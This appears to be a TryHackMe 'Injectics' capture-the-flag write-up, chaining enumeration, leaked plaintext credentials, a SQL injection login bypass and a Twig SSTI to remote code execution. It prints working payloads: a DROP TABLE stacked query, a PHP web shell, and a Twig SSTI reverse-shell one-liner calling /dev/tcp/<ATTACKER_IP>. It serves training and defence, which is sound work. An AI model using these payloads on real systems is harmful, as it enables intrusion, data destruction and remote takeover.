# TryHackMe – Injectics

This is a formal writeup for the **Injectics** room on TryHackMe, rated as **easy/medium**.  
The challenge covers **information disclosure**, **SQL injection**, **authentication bypass**, and **Server-Side Template Injection (SSTI)** leading to Remote Code Execution.

***

## Overview

Objectives of the room:

- Perform port scanning to identify exposed services and gather initial intelligence.
- Enumerate hidden directories and files using FeroxBuster.
- Identify and exploit information disclosure vulnerabilities.
- Bypass authentication via SQL injection.
- Exploit SSTI (Twig) on the admin profile update form to obtain a reverse shell.
- Retrieve the user flag from the admin panel and the root flag from the `/flags` directory.

***

## Port Scanning and Service Discovery

### Open Ports

Full port scan with version detection and default scripts:

```bash
nmap -sV -sC -Pn -p- -T4 --min-rate 5000 <TARGET>
```

**Result**: 2 ports open:

| Port | Protocol | Service |
|------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.2 |
| 80/tcp | HTTP | Apache httpd 2.4.41 |

**Notable finding from Nmap NSE scripts**: The `PHPSESSID` cookie has `HttpOnly` set to `false`. This reveals two key pieces of information:

- The backend is **PHP-based**, which will inform our injection approach.
- The session cookie is partially unprotected — while XSS is outside the scope of this room, this is worth noting as an additional attack surface in a real engagement.

***

## Web Application Enumeration

### Directory and File Discovery with FeroxBuster

With a PHP backend confirmed on port 80, directory and file brute-forcing is performed to uncover hidden endpoints and sensitive files:

```bash
feroxbuster -u http://<TARGET> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,json \
  -s 200,301,302,403 \
  -t 50 \
  -o injectics_enum.txt \
  --auto-tune
```

**Flag breakdown**:

- `-x php,html,txt,bak,old,json` — targets common file extensions, including backups and configuration files.
- `-s 200,301,302,403` — captures successful responses, redirects, and forbidden resources (which confirm existence).
- `-t 50` — sets thread concurrency to balance speed vs. server stability.
- `--auto-tune` — dynamically adjusts request rate based on server response behaviour.

**Notable results**:

- `/dashboard` — requires authentication; likely contains the user flag.
- `/flags` — confirmed target for the root flag; access restricted.
- `/adminLogin007.php` — non-standard admin login endpoint labelled *Restricted Area*.
- `composer.json` — reveals **Twig** as the template engine (critical for later SSTI exploitation).

### Source Code Analysis — index.php

Inspecting the HTML source of `index.php` reveals two developer comments:

```html
<!-- Website developed by John Tim - dev@injectics.thm -->
<!-- Mails are stored in mail.log file -->
```

**Impact assessment**:

- `dev@injectics.thm` provides a potential username for authentication attempts.
- The reference to `mail.log` constitutes a **sensitive data exposure** — a directly navigable log file containing plaintext credentials.

### Credential Extraction — mail.log

Navigating directly to `http://<TARGET>/mail.log` exposes the file contents: an email log containing **two sets of plaintext credentials**, including an account for `superadmin@injectics.thm`.

> **Why this is critical**: Storing credentials in a world-readable log file is a severe misconfiguration. In a real environment this would constitute a Critical finding under **OWASP A02:2021 – Cryptographic Failures** and **A05:2021 – Security Misconfiguration**.

***

## Initial Access – SQL Injection Authentication Bypass

### Attempt with Extracted Credentials

Attempting to log in at `/adminLogin007.php` with the `superadmin` credentials extracted from `mail.log` fails — the credentials appear to be overridden or salted differently in the live database.

### Authentication Bypass via SQL Injection

The standard login form at `index.php` is tested for SQL injection using a classic boolean-based bypass:

```
' OR 1=1;-- -
```

The application returns an error indicating **invalid characters** — a basic WAF or input filter is stripping single quotes.

**Bypass technique**: Intercept the login request with Burp Suite and replace the `OR` operator with `||` (logical OR in SQL), which may not be caught by the same filter:

```
email=<EMAIL>||1=1-- -&password=anything
```

**Result**: Authentication bypass successful — access granted to `/dashboard.php`.

> **Why this works**: The filter blacklists `'` and potentially the keyword `OR`, but fails to account for SQL's equivalent operator `||`. This is a classic **incomplete input sanitisation** bypass — filtering specific patterns without sanitising the full operator set.

***

## Post-Authentication Exploitation – DROP TABLE & Admin Access

### Identifying the Injection Vector

The `/dashboard.php` panel contains a data table with editable fields. Each form submission triggers a SQL query on the backend — a potential **second-order SQL injection** surface.

Additionally, from `mail.log`, it is known that if the `users` table is dropped, the application restores default credentials. This constitutes a recoverable attack path.

### Dropping the Users Table

Insert the following payload into any dashboard form field:

```sql
1; DROP TABLE users;
```

**Response**:

```
Seems like database or some important table is deleted.
InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

This confirms **stacked query execution** is permitted — the application is not using parameterised queries.

### Accessing the Admin Panel

After waiting 1–2 minutes for the restore service to reinitialise default credentials, log in to `/adminLogin007.php` with:

```
Email:    superadmin@injectics.thm
Password: superSecurePasswd101
```

**Result**: Admin panel access granted. **Flag 1 obtained** — displayed directly on the admin dashboard.

***

## Remote Code Execution – SSTI (Twig) via Profile Update

### Identifying the SSTI Surface

The admin panel exposes a **Profile Update** form. The welcome message on the dashboard reads `Welcome, admin!`, suggesting user-controlled input is rendered within a template.

The `composer.json` file discovered during enumeration confirmed **Twig** as the templating engine. Twig is a PHP templating library known to be vulnerable to SSTI when user input is rendered unsanitised.

### Confirming SSTI

Submit the following payload in the profile update form (e.g., the name/username field):

```
{{7*7}}
```

**Expected result**: The welcome message changes to `Welcome, 49!` instead of rendering the literal string — confirming **Twig SSTI**.

> **Why this confirms SSTI**: Twig evaluates `{{ }}` expression blocks server-side before rendering. If user input reaches the template engine unescaped, arbitrary expressions — including system calls — can be injected.

### Obtaining a Reverse Shell

**Step 1** — Set up a Netcat listener on the attack machine:

```bash
nc -nvlp 4444
```

**Step 2** — Create a PHP web shell and serve it via a Python HTTP server:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
```

**Step 3** — Inject the following Twig SSTI payload into the profile update field:

```twig
{{ ["bash -c 'exec bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'", ""] | sort('passthru') }}
```

**Result**: Reverse shell obtained.

> **Payload reference**: [PayloadsAllTheThings – SSTI Twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

***

## Flag Retrieval

### Flag 1 – Admin Panel Flag

Obtained upon successful login to `/adminLogin007.php` with restored `superadmin` credentials after `DROP TABLE` exploit.

**Location**: `/dashboard.php` — displayed directly on the admin panel.

### Flag 2 – Server Flag

With the reverse shell active, navigate to the `/flags` directory on the server:

```bash
cd flags
ls
cat <flag_file>
```

**Location**: `/var/www/html/flags/` (or equivalent server path)

***

## Lessons Learned

This challenge demonstrates a multi-stage **PHP web application attack chain**:

1. **Cookie analysis** → `HttpOnly: false` on `PHPSESSID` reveals PHP backend.
2. **Information disclosure** → `mail.log` exposed via developer comment in source code → plaintext credentials.
3. **SQL injection bypass** → `||` operator bypasses partial WAF filtering on login form.
4. **Stacked queries** → `DROP TABLE` via dashboard form triggers application restore mechanism.
5. **Admin access** → Default credentials from `mail.log` valid post-restore.
6. **SSTI (Twig)** → Unsanitised input in profile update form → RCE via `passthru` filter.

**Key takeaways**:

- **Never store credentials in log files**, especially in web-accessible directories. Use environment variables or secrets managers.
- **Input validation must cover the full SQL operator set** — blacklisting `OR` while permitting `||` is equivalent to no protection.
- **Parameterised queries / prepared statements** are the only reliable defence against SQL injection — all other mitigations are bypassable.
- **Template engines must never render raw user input** — always use auto-escaping and avoid passing untrusted data to Twig's `render()` or equivalent.
- **`composer.json` should not be web-accessible** — it exposes library versions and potential attack vectors to unauthenticated users.

**OSCP relevance**: Covers manual SQL injection, WAF bypass, source code analysis, and Twig SSTI RCE — all high-value techniques for the OSCP web exploitation module.

***

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Techniques demonstrated are specific to TryHackMe training environments.  
> Do not use outside authorized lab environments or in violation of TryHackMe terms of service.
